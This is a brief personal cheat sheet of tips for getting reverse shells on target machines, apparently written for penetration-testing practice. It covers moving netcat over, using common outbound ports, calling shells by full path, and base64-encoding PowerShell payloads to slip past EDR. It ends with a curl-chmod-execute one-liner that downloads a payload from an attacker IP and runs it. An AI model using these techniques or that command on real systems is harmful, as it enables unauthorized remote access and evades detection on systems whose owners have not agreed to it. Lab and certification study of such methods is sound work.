Some notes for trying to get reverse shells

May need to transfer toolings over
	ie
	nc.exe
	etc...

Try over common ports like 80, 443, 53, etc... stuff that is open to the outside

Try tool full paths
	instead of sh
		/bin/sh
	instead of powershell
		`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`

Try base64 encoding payloads
	ie
		~/tools/mkpsrevshell.py
	can bypass certain syntax issues, security restrictions, EDR, etc

Premade exploits
	READ CODE SLOWLY
	might see flags you are supposed to use that you are missing

URL encoding sucks 
	Revshell has build in encoding if you need it


Try a few different binaries
	nc not working?
	try busybox nc
		etc...
	curl && chmod && execute almost always works
		example:
		`curl 192.168.45.183/revshell -o /tmp/revshell && chmod +x /tmp/revshell && ./revshell